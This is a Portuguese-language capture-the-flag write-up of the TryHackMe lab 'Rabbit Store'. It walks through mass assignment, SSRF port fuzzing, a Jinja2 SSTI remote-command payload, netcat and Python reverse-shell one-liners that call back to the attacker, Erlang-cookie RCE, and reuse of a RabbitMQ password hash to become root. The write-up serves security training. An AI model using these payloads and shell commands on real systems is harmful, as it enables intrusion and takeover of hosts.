---
title: Rabbit Store | TryHackMe
date: 2026-03-04 00:00:00 +0000
categories:
  - writeups
  - medium
tags:
  - writeups
  - ctf
  - tryhackme
---
# Rabbit Store
## Sobre a máquina
Uma excelente oportunidade para treinar SSRF, SSTI, RCE e Mass Assignment! além de treinar RabbitMQ pentesting.

| Sistema Opracional | Linux                                                  |
| ------------------ | ------------------------------------------------------ |
| Difivuldade        | Medium                                                 |
| Vulnerabilidades   | Mass Assignment, SSRF, SSTI, RCE                       |
| Link               | [Rabbit Store](https://tryhackme.com/room/rabbitstore) |
## Atacando...
### Recon
Vamos começar pelo bom e velho recon, um recon ruim, a probabilidade de um ataque falhar é alta. Gosto sempre de começar por um recon mais simples, para te ruma noção de quais serviços vou encarar na máquina é só então em cima desses serviços faço um recon mais apurado. 

Começando pelo recon mais simples, vamos caçar todas as portas portas abertas da máquina:
`sudo nmap -sS -v -p- --min-rate 5000 10.66.188.236 -oN nmap/first.txt`

Vamos dar uma olhada nos resultados:
```
# Nmap 7.95 scan initiated Wed Mar  4 14:41:50 2026 as: /usr/lib/nmap/nmap -sS -v -p- --min-rate 5000 -oN nmap/first.txt 10.66.188.236
Nmap scan report for 10.66.188.236
Host is up (0.15s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
4369/tcp  open  epmd
25672/tcp open  unknown
```
Interessante!
Agora vamos dar um aprofundada a mais nesses serviços:
`sudo nmap -sCV -v -p22,80,4369,25672 10.66.188.236 -oN nmap/versions.txt`
Vamos dar uma olhada agora:
```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3f:da:55:0b:b3:a9:3b:09:5f:b1:db:53:5e:0b:ef:e2 (ECDSA)
|_  256 b7:d3:2e:a7:08:91:66:6b:30:d2:0c:f7:90:cf:9a:f4 (ED25519)
80/tcp    open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://cloudsite.thm/
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
4369/tcp  open  epmd    Erlang Port Mapper Daemon
| epmd-info: 
|   epmd_port: 4369
|   nodes: 
|_    rabbit: 25672
25672/tcp open  unknown
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Certo, vemos um servidor web ali, um SSH, e vemos um serviço diferente ali!

O **epmd**, se você perguntar ao ChatGPT ai, verás que ele vai te dize que se trata de uma linguagem de programação e etc... Deixo esse trabalho da pesquisa e do entendimento do serviço para você, faz parte do nosso trabalho.

Daremos uma atenção melhor a esse serviço posteriormente, certamente nos ajudará em alguma coisa. Por agora, não conseguiremos muita coisa.

Olhando com carinho, vermos que conseguimos uma URL ali: **cloudsite.thm**, já adicionaremos no `/etc/hosts` e vamos dar uma investigada melhor no que pode ter lá!
### O Mass Assignment
Se tu mexer um pouco pelo site, não verá nada demais nele, exceto uma coisa, ao clicar para fazer login, somos redirecionamos para a URL: **storage.cloudsite.thm**.

Adicionamos ao arquivo `hosts`, e dando uma olhara, vemos que conseguimos registrar um conta. 

Mas acontece algo curioso, quando registramos uma conta qualquer e tentamos fazer login:

![Mensagem de erro de storage.cloudsite.thm](../assets/img/rabbit_store/sorry.png)

Interessante! Parece que para acessar precisaríamos ter uma espécie de assinatura por parte da empresa!

Pensando nisso, deve ter alguma forma de controle de sessão. Vamos averiguar se há alguma JWT, cookie ou algo do tipo para controle de sessão.

Com isso em mente, uma olhada no Storage do browser nos revela o "mistério", vemos um JWT!

![JWT Storage do browser](../assets/img/rabbit_store/jwt.png)

E olhando o JWT confirmamos o controle:

```
┌──(kali㉿kali)-[~/Documents/ctf/thm/rabbit_store]
└─$ echo "eyJlbWFpbCI6ImJpZWxAYmllbHphby5jb20iLCJzdWJzY3JpcHRpb24iOiJpbmFjdGl2ZSIsImlhdCI6MTc3MjY1NDk2NiwiZXhwIjoxNzcyNjU4NTY2fQ" | base64 -d | jq 
{
  "email": "biel@bielzao.com",
  "subscription": "inactive",
  "iat": 1772654966,
  "exp": 1772658566
}
```

O campo `subscription` controla a assinatura da conta; 

Já para te adiantar, fazer o *tampering* não funciona, mas se quiser tentar, fique a vontade, pode isar o `jwt_tools` para isso.

Certo, se não conseguimos fazer o tampering do JWT, como podemos tetar star esse campo para *active*?

E porque não um *Mass Assignment*?

Vamos interceptar a request de criação de conta e tentar criar uma com a assinatura ativa:

![Request Ativando Subscription](../assets/img/rabbit_store/ativando.png)

Basicamente o que fiz, foi jogar a request de criação de conta pro repeater e adicionar o campo *subscription* com *active* como seu valor na request, visto que na request original não existe esse campo. Ah e lembre-se de não repetir o usuário, por isso mudei para "rato".

Vemos que funcionou! hehe

![Assinatura Ativa](../assets/img/rabbit_store/ativa.png)

Excelente!

### SSRF
Neste cenário, talvez você já logo pense: Webshell! Não te julgo, foi o que eu pensei! Hehehe

Você pode tentar webshell ai que não vai, Vai por mim, mas caso ainda não tenha tentado, tente!

Agora eu te convido a pensar: Percebeu o campo ali? "Upload from URL" te lembra alguma possível vulnerabilidade? Veja que ele vai fazer request pra algum lugar.

Talvez você tenha pensado no RFI, mas lembre-se que que seria interessante se conseguíssemos executar uma Webshell ali, ai sim, o RFI seria excelente!

O bom e velho **SSRF** pode entrar ali! O que precisamos é apenas confirmar, e para isso, o Python já de ajuda:
`python3 -m http.server`

E veja! A requisição bateu!
```
┌──(kali㉿kali)-[~/Documents/ctf/thm/rabbit_store]
└─$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.66.188.236 - - [04/Mar/2026 15:59:34] "GET / HTTP/1.1" 200 -
```

Certo! Ao prestarmos atenção na URL, vemos que se trata de uma API! Será que conseguimos acessar a documentação dela? Podemos usar esse SSRF ao nosso favor e tentar achar! Geralmente essas docs ficam em `/api/docs`, vamos tentar dessa forma e ver se conseguimos achar, se não, tentaremos outros diretórios.

Mas antes, precisamos saber melhor como funciona essa feature de upload via URL.

Se você testar um pouco verás que quando ela consegue acessar o conteúdo, ela retorna 200 e faz o upload do mesmo anexando na própria aplicação, quando não consegue, retorna erro 500 e não anexa nada.

Sabendo disso, já sabemos como enumerar serviços internos da aplicação.
Se você usar o Burp Community pra isso levará uma eternidade, usaremos o `ffuf`, e verás diferença!

Usando a feature de upload via URL, faça uma request para `localhos:80/api/docst`, por exemplo:

![Request para localhost](../assets/img/rabbit_store/localhost.png)

Usando o Burp ou mesmo o browser (via aba Networks do DevTools), pegue essa request e salve em um arquivo de texto.

Precisamos de uma wordlist com número de todas a portas possíveis, para isso conseguimos usar o própria `bash` para gerar:
`echo {1..65365} | tr " " "\n" > ports.txt`

Agora, edite o arquivo da request da seguinte maneira:
```
POST /api/store-url HTTP/1.1
Host: storage.cloudsite.thm
Content-Length: 29
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://storage.cloudsite.thm
Referer: http://storage.cloudsite.thm/dashboard/active
Accept-Encoding: gzip, deflate, br
Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InJhdG9AYmllbHphby5jb20iLCJzdWJzY3JpcHRpb24iOiJhY3RpdmUiLCJpYXQiOjE3NzI2NzM0OTQsImV4cCI6MTc3MjY3NzA5NH0.mBNa5DGG4x8sEnpKyjkXQ7M1A3IwImEJ087gCajStXo
Connection: keep-alive

{"url":"http://localhost:FUZZ/api/docs"}
```

E no `ffuf` podemos fazer o seguinte:
`ffuf -request req.txt -w ./ports.txt -request-proto http -fc 500`

Já filtraremos requests com status code 500 para facilitar a visualização da output.

Aqui está o resultado:

```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://storage.cloudsite.thm/api/store-url
 :: Wordlist         : FUZZ: /home/kali/Documents/ctf/thm/rabbit_store/ports.txt
 :: Header           : Host: storage.cloudsite.thm
 :: Header           : Accept-Language: en-US,en;q=0.9
 :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
 :: Header           : Content-Type: application/json
 :: Header           : Accept: */*
 :: Header           : Accept-Encoding: gzip, deflate, br
 :: Header           : Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InJhdG9AYmllbHphby5jb20iLCJzdWJzY3JpcHRpb24iOiJhY3RpdmUiLCJpYXQiOjE3NzI2NzM0OTQsImV4cCI6MTc3MjY3NzA5NH0.mBNa5DGG4x8sEnpKyjkXQ7M1A3IwImEJ087gCajStXo
 :: Header           : Connection: keep-alive
 :: Header           : Origin: http://storage.cloudsite.thm
 :: Header           : Referer: http://storage.cloudsite.thm/dashboard/active
 :: Data             : {"url":"http://localhost:FUZZ/api/docs"}
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 500
________________________________________________

80                      [Status: 200, Size: 106, Words: 5, Lines: 1, Duration: 262ms]
3000                    [Status: 200, Size: 106, Words: 5, Lines: 1, Duration: 283ms]
8000                    [Status: 200, Size: 106, Words: 5, Lines: 1, Duration: 228ms]
15672                   [Status: 200, Size: 106, Words: 5, Lines: 1, Duration: 397ms]
```

Ignoremos a 80 e daremos um olhada com mais carinho nas outras.

Agora que já sabemos quais portas olharmos, podemos testar uma por uma ali nests feature de Upload via URL, baixar o seu conteúdo e ver o que está rodando em cada URL.

E de primeira, se você tentou a 3000 verás que é justamente a documentação da API!

```
┌──(kali㉿kali)-[~/Downloads]
└─$ cat cf52db8d-d795-4272-aa4f-f090ce9f0258 
Endpoints Perfectly Completed

POST Requests:
/api/register - For registering user
/api/login - For loggin in the user
/api/upload - For uploading files
/api/store-url - For uploadion files via url
/api/fetch_messeges_from_chatbot - Currently, the chatbot is under development. Once development is complete, it will be used in the future.

GET Requests:
/api/uploads/filename - To view the uploaded files
/dashboard/inactive - Dashboard for inactive user
/dashboard/active - Dashboard for active user

Note: All requests to this endpoint are sent in JSON format.
```

Opa, tem um endpoint interessante ali! `/api/fetch_messeges_from_chatbot` parece que está em desenvolvimento ainda, isso é bom, pode conter vulnerabilidades ali!
### SSTI + RCE + User Flag
Certo, tentando acessar esse endpoint vemos algo interessante!

![Get não permitido](../assets/img/rabbit_store/get_nao_permitido.png)

Certo, mudando para POST então, recebemos outro erro:

![Internal Error](../assets/img/rabbit_store/internal_error.png)

Certo, algum erro interno do servidor. Toda comunicação anterior da API foi em JSON, vamos mudar ali no Content-Type para JSO:N, talvez possa ser isso:

![Json](../assets/img/rabbit_store/json.png)

Excelente! Veja que recebemos outro erro indicando que está faltando o parâmetro username!

Vamos adicionar!

![Rato espelhado](../assets/img/rabbit_store/rato_espelhado.png)

Certo! 

É nessa hora que um olhar analítico juntamento com uma mente ofensiva fa toda diferença!

Se você reparou bem, o valor do parâmetro **username** foi espelhado ali na resposta; E se você fizer alguns restes (faça e verás), irá perceber que da exata forma que você põe ali o username, ele será refletido ali na página de erro gerada, sem mais modificações. 

Nessa hora, você pensa: Excelente, XSS!

Mas, por que não tentar algo diferente? Que tal um SSTI? É bem comum em cenários de CTFs.

Um XSS não teria tanto impacto aqui neste cenário, já um SSTI sim! Podendo levar até mesmo a um RCE! Por mais que Se trate de um CTF, sempre pense em IMPACTO.

Se você der uma pesquisada em payloads SSTI ai pela internet, como o [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection), e tentar alguns, verás que um funciona e que realmente temos um SSTI ali!

![SSTI Detect](../assets/img/rabbit_store/ssti_detect.png)

Dando uma olhada no site que te indiquei, verás também que esse payload é correspondente a engine Jinja2 (Python)! Isso é excelente! Já nos denuncia qual é a engine por trás da geração desta página de errro.

Excelente! Agora que sabemos que se trata da Jinja2, precisamos saber se há alguma forma de executar comados no servidor através desse SSTI, caçando um payload pela internet, você encontra esse aqui:
`{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

Testando esse payload na aplicação, veja que funcionou! Conseguimos um executar comados!

![RCE](../assets/img/rabbit_store/rce.png)

Maravilha! Pois partiremos agora para uma shell! Vou usar o payload:
`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <seu_ip> 9001 >/tmp/f`

Mas fica a teu critério qual utilizar! Basta colocar no lugar do `id` ali no payload do SSTI e testar!

`{{request.application.__globals__.__builtins__.__import__('os').popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <seu_ip> 9001 >/tmp/f').read()}}`

Veja que recebemos a shell!

```
┌──(kali㉿kali)-[~/Documents/ctf/thm/rabbit_store]
└─$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [REMOVIDO] from (UNKNOWN) [10.67.142.43] 47234
sh: 0: can't access tty; job control turned off
$ 

```

Maravilha! Caso queira uma shell mais estável:
```
1. Digite:
   script /dev/null -c bash
   ou
   python3 -c 'import pty;pty.spawn("/bin/bash")'
   
2. Aperte CTRL+Z e depois digite:
   stty raw -echo && fg
   
3. Digite reset, dê enter e depis digite screen, dê enter de novo. 
```

Com uma shell mais estável, agora basta ir em `/home/azrael` e pegar a **user flag.**
### Root Flag
Certo, antes de qualquer coisa, vamos executar o `pspy64` na máquina e ver se encontramos algo interessante, usaremos isso como ponto de partida.

Baixo o `pspy64` [aqui](https://github.com/DominicBreuker/pspy) e envie para a máquia alvo, pode ser via:
`python3 -m http.server`

Ao executar o `pspy64`, depois de uns segundos, vemos algo interessate!

```
2026/03/05 03:53:49 CMD: UID=124   PID=9863   | sh -c exec /bin/sh -s unix:cmd 
2026/03/05 03:53:49 CMD: UID=124   PID=9864   | /bin/sh -s unix:cmd 
2026/03/05 03:53:59 CMD: UID=124   PID=9865   | sh -c exec /bin/sh -s unix:cmd 
2026/03/05 03:53:59 CMD: UID=124   PID=9866   | /bin/sh -s unix:cmd 
2026/03/05 03:54:09 CMD: UID=124   PID=9867   | /bin/sh -s unix:cmd 
2026/03/05 03:54:09 CMD: UID=124   PID=9868   | /usr/bin/df -kP /var/lib/rabbitmq/mnesia/rabbit@forge 
2026/03/05 03:54:19 CMD: UID=124   PID=9869   | sh -c exec /bin/sh -s unix:cmd 
2026/03/05 03:54:19 CMD: UID=124   PID=9870   | /bin/sh -s unix:cmd 
2026/03/05 03:54:29 CMD: UID=124   PID=9871   | /bin/sh -s unix:cmd 
2026/03/05 03:54:29 CMD: UID=124   PID=9872   | /usr/bin/df -kP /var/lib/rabbitmq/mnesia/rabbit@forge
```

Interessante! Parece que há uma instancia do **RabbitMQ** executando!  E isso explica também a existência do EPMD na máquina! 

Se você fez o trabalho de pesquisar, viu que eles possuem relação, que o Erlang, em termo bem simples, seria como  o backend do RabbitMQ. 

Se olharmos o `/etc/passwd` veremos o usuário responsável pelo RabbitMQ:
```
colord:x:121:127:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
gdm:x:123:130:Gnome Display Manager:/var/lib/gdm3:/bin/false
rabbitmq:x:124:131:RabbitMQ messaging server,,,:/var/lib/rabbitmq:/usr/sbin/nologin
```

Veja que o UID bate com o mostrado pelo `pspy64` confirmado o cenário!

Pesquisando um pouco vemos que há uma possibilidade de execução código via EPMD neste cenário, [aqui](https://book.hacktricks.wiki/en/network-services-pentesting/4369-pentesting-erlang-port-mapper-daemon-epmd.html#erlang-cookie-rce) está a referência.

Precisamos do `.erlang.cookie`, e conseguimos facilmente encontrar com o `find`:
`find / -type f -name .erlang.cookie 2>/dev/null`

Aqui está:
```
azrael@forge:~$ find / -type f -name .erlang.cookie 2>/dev/null
/var/lib/rabbitmq/.erlang.cookie
```

Certo, agora seguindo o passo a passo da referência, veja que conseguimos a execução de código no contexto do usuário **rabbitmq**

```
azrael@forge:~$ HOME=/ erl -sname ratao -setcookie cHMH4i3nHJYM3xPS
Erlang/OTP 24 [erts-12.2.1] [source] [64-bit] [smp:2:2] [ds:2:2:10] [async-threads:1] [jit]

Eshell V12.2.1  (abort with ^G)
(ratao@forge)1> rpc:call('rabbit@forge', os, cmd, [whoami]).
"rabbitmq\n"
(ratao@forge)2> 
```

Excelente! Vamos pegar uma shell com esse usuário!

```
(ratao@forge)3> rpc:call('rabbit@forge', os, cmd, ["python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<seu_ip>\", 9002));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"]).
```

Conseguimos!
```
┌──(kali㉿kali)-[~/Documents/ctf/thm/rabbit_store]
└─$ nc -lvnp 9002
listening on [any] 9002 ...
connect to [REMOVIDO] from (UNKNOWN) [10.67.142.43] 57506
/bin/sh: 0: can't access tty; job control turned off
$ whoami
rabbitmq
```

Siga os mesmos passos anteriores para pegar uma shell mais estável!

Ao pesquisarmos um pouco sobre  RabbitMQ, parece que ele expões informações sobre usuários, se tivermos acesso a suas configurações.

Dando uma pesquisada, Vemos  que podemos tentar conversar cm o RabbitMQ usando o `rabbitmqctl`, uma tool CLI usando para conversar com ele via terminal.

Vamos tentar listar o usuários presentes na configuração do RabbitMQ:
`rabbitmqctl list_users`

Recebemos um erro:
```
rabbitmq@forge:~$ rabbitmqctl list_users

04:30:11.279 [error] Cookie file ./.erlang.cookie must be accessible by owner only

04:30:12.199 [error] Cookie file ./.erlang.cookie must be accessible by owner only

04:30:12.204 [error] Cookie file ./.erlang.cookie must be accessible by owner only

04:30:13.074 [error] Cookie file ./.erlang.cookie must be accessible by owner only

```

Para resolver isso, basta fazer um:
`chmod 600 .erlang.cookie`

Veja que agora conseguimos:

```
rabbitmq@forge:~$ rabbitmqctl list_users                                   
Listing users ...
user    tags
The password for the root user is the SHA-256 hashed value of the RabbitMQ root user's password. Please don't attempt to crack SHA-256.        []
root    [administrator]

```

Era problema de permissionamento!

E olha que interessante, vemos um aviso sobre a senha do usuário `root` estar criptografada e seu algoritmo usado, 

Se pesquisar mais um pouco, vemos que a configuração do RabbitMQ expões hashs, vamos tentar exportá-la!
```
rabbitmq@forge:~$ rabbitmqctl export_definitions /tmp/def.json
Exporting definitions in JSON to a file at "/tmp/def.json" ...
```

Certo! Vamos olhar para ver se encontramos algo!
```
rabbitmq@forge:~$ cat /tmp/def.json 
{"bindings":[],"exchanges":[],"global_parameters":[{"name":"cluster_name","value":"rabbit@forge"}],"parameters":[],"permissions":[{"configure":".*","read":".*","user":"root","vhost":"/","write":".*"}],"policies":[],"queues":[{"arguments":{},"auto_delete":false,"durable":true,"name":"tasks","type":"classic","vhost":"/"}],"rabbit_version":"3.9.13","rabbitmq_version":"3.9.13","topic_permissions":[{"exchange":"","read":".*","user":"root","vhost":"/","write":".*"}],"users":[{"hashing_algorithm":"rabbit_password_hashing_sha256","limits":{},"name":"The password for the root user is the SHA-256 hashed value of the RabbitMQ root user's password. Please don't attempt to crack SHA-256.","password_hash":"vyf4qvKLpShONYgEiNc6xT/5rLq+23A2RuuhEZ8N10kyN34K","tags":[]},{"hashing_algorithm":"rabbit_password_hashing_sha256","limits":{},"name":"root","password_hash":"49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF","tags":["administrator"]}],"vhosts":[{"limits":[],"metadata":{"description":"Default virtual host","tags":[]},"name":"/"}]}
```

Tudo bagunçado, vamos melhorar a visualização na nossa máquina:

```
┌──(kali㉿kali)-[~/Documents/ctf/thm/rabbit_store]
└─$ echo '{"bindings":[],"exchanges":[],"global_parameters":[{"name":"cluster_name","value":"rabbit@forge"}],"parameters":[],"permissions":[{"configure":".*","read":".*","user":"root","vhost":"/","write":".*"}],"policies":[],"queues":[{"arguments":{},"auto_delete":false,"durable":true,"name":"tasks","type":"classic","vhost":"/"}],"rabbit_version":"3.9.13","rabbitmq_version":"3.9.13","topic_permissions":[{"exchange":"","read":".*","user":"root","vhost":"/","write":".*"}],"users":[{"hashing_algorithm":"rabbit_password_hashing_sha256","limits":{},"name":"The password for the root user is the SHA-256 hashed value of the RabbitMQ root user's password. Please don't attempt to crack SHA-256.","password_hash":"vyf4qvKLpShONYgEiNc6xT/5rLq+23A2RuuhEZ8N10kyN34K","tags":[]},{"hashing_algorithm":"rabbit_password_hashing_sha256","limits":{},"name":"root","password_hash":"49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF","tags":["administrator"]}],"vhosts":[{"limits":[],"metadata":{"description":"Default virtual host","tags":[]},"name":"/"}]}' | jq
```

E olhando bem vemos lá a hash!

```
    {
      "hashing_algorithm": "rabbit_password_hashing_sha256",
      "limits": {},
      "name": "root",
      "password_hash": "49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF",
      "tags": [
        "administrator"
      ]
    }

```

Já que não podemos quebrar, talvez consigamos fazer algo com ela, usar em algum lugar, não sei, é tentativa e erro.

Certo, nesta hora vemos a importância de se informar o máximo possível sobre o serviço a qual estamos lidando.

Se você pesquisar um pouco mais, você verá que o algoritmo para a formação da hash das senhas do RabbitMQ está disponível na própria documentação! [Aqui](https://www.rabbitmq.com/docs/passwords#this-is-the-algorithm) está.

This is the algorithm:
- Generate a random 32 bit salt. In this example, we will use `908D C60A`. When RabbitMQ creates or updates a user, a random salt is generated.
- Prepend the generated salt with the UTF-8 representation of the desired password. If the password is `test12`, at this step, the intermediate result would be `908D C60A 7465 7374 3132`
- Take the hash (this example assumes the default [hashing function](https://www.rabbitmq.com/docs/passwords#changing-algorithm), SHA-256): `A5B9 24B3 096B 8897 D65A 3B5F 80FA 5DB62 A94 B831 22CD F4F8 FEAD 10D5 15D8 F391`
- Prepend the salt again: `908D C60A A5B9 24B3 096B 8897 D65A 3B5F 80FA 5DB62 A94 B831 22CD F4F8 FEAD 10D5 15D8 F391`
- Convert the value to base64 encoding: `kI3GCqW5JLMJa4iX1lo7X4D6XbYqlLgxIs30+P6tENUV2POR`
- Use the finaly base64-encoded value as the `password_hash` value in HTTP API requests and generated definition files

Seguindo os mesmos passos, chegamos na hash + o saltt:
```
┌──(kali㉿kali)-[~/Documents/ctf/thm/rabbit_store]
└─$ echo '49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF' | base64 -d | xxd -p -c 50

e3d7ba85295d1d16a2617df6f7e6630527ff2f1ebb5c43b3f6ec614811ed194f98073585
```

Se removermos os primeiros 4 bytes, teremos a hash pura, sem o salt adicionado pela segunda vez (embora ele tenha sido adicionado pela primeira vez, leia o algoritmo acima):

`295d1d16a2617df6f7e6630527ff2f1ebb5c43b3f6ec614811ed194f98073585`

Vamos tentar utilizar isso como senha para o usuário root, na tentativa e erro, talvez funcione:
```
rabbitmq@forge:~$ su root
Password: 
root@forge:/var/lib/rabbitmq# 
```

E funcionou! Hehe! Um caso clássico de **Password Reusage!**

Agora basta pegar a flag root!